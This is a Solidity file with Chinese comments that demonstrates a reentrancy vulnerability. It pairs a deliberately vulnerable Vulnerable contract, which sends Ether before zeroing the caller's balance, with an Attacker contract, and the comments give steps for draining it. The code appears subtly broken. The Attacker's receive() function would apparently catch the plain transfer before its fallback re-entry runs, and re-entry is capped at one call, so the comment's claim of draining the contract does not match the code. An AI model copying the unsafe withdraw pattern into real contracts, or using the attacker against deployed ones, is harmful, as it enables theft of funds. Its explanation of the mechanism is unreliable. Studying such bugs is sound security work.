// SPDX-License-Identifier: UNLICENSED
// Solidity >=0.8.0
pragma solidity >=0.8.0;

/*
這個合約展示了 Unsafe External Calls 漏洞，主要漏洞在 withdraw() 函式中，在呼叫外部合約前沒有先更新狀態變數，導致可以利用 reentrancy 進行攻擊。

漏洞重點:
- 當執行 withdraw 時，先透過 msg.sender.call(…) 呼叫外部合約，在呼叫成功之後才將 balances[msg.sender] 設為 0，這使得攻擊者能夠在 fallback 函式中再度呼叫 withdraw 以提取重複的 Ether。

警告修正：
- 修改 Attacker 合約的 constructor，將 _vulnerableAddress 參數型別改為 address payable，解決編譯錯誤。

部署與測試:
1. 部署 Vulnerable 合約。
2. 部署 Attacker 合約，並設定 Vulnerable 合約的位址 (必須傳入 payable address)。
3. 透過 Attacker 合約執行 attack() 函式，觸發 reentrancy 攻擊，吸光 Vulnerable 合約中的 Ether。
*/

contract Vulnerable {
    // 狀態變數，記錄每個地址所存放的 Ether
    mapping(address => uint256) public balances;

    // 存款函式
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 弱點: withdraw 函式在呼叫外部地址前未更新狀態，容易被 reentrancy 攻擊
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient funds");

        // 不安全：外部呼叫前尚未更新狀態
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Ether transfer failed");

        // 狀態更新在外部呼叫之後，造成 reentrancy 漏洞
        balances[msg.sender] = 0;
    }

    // fallback 與 receive 函式用於接收 Ether
    receive() external payable {}
}

// 攻擊合約，利用 reentrancy 漏洞進行攻擊
contract Attacker {
    Vulnerable public vulnerable;
    bool private attackInProgress = false;

    // 在部署時注入 Vulnerable 合約位址，此處修改型別為 address payable 以符合要求
    constructor(address payable _vulnerableAddress) {
        vulnerable = Vulnerable(_vulnerableAddress);
    }

    // 攻擊者的 fallback 函式，當 Vulnerable 合約透過 call 發送 Ether 時會觸發
    fallback() external payable {
        // 檢查 Vulnerable 合約中的 Ether 是否足夠，並確保攻擊只執行一次 reentrancy
        if (address(vulnerable).balance >= msg.value && !attackInProgress) {
            attackInProgress = true;
            // 重新呼叫 withdraw() 進行 reentrancy
            vulnerable.withdraw();
        }
    }

    /*
    攻擊步驟:
    1. 呼叫 attack() 並附帶 Ether，此 Ether 會存入 Vulnerable 合約的 balances。
    2. 在第一次 withdraw 呼叫時，觸發 fallback()，進入 reentrancy
    3. 透過 fallback() 再次執行 withdraw()。
    */
    function attack() external payable {
        require(msg.value > 0, "Need to send some Ether");
        // 存款到 Vulnerable 合約
        vulnerable.deposit{value: msg.value}();
        // 呼叫 withdraw 啟動 reentrancy 攻擊
        vulnerable.withdraw();
    }

    // 從攻擊合約中提取 Ether
    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // 接收 Ether 函式
    receive() external payable {}
}
